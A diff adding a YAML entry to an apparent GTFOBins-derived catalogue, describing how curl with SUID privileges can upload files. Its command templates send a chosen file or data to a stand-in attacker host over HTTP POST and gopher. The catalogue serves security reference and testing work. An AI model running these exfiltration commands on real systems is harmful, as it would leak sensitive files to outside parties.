@@ -1,0 +1,27 @@
+id: gtfobins/curl/upload/suid
+type: binary
+platform: linux
+name: curl
+phases:
+- exfiltration
+- privilege-escalation
+capabilities:
+- file-upload
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: curl -X POST --data-binary @/path/to/input-file http://attacker.com
+- template: curl -X POST --data-binary DATA http://attacker.com
+- template: curl gopher://attacker.com:12345/_DATA
+  comment: Data will be `\r\n` terminated.
+references:
+- https://gtfobins.github.io/gtfobins/curl/
+tags:
+- linux
+- unix
+- gtfobins
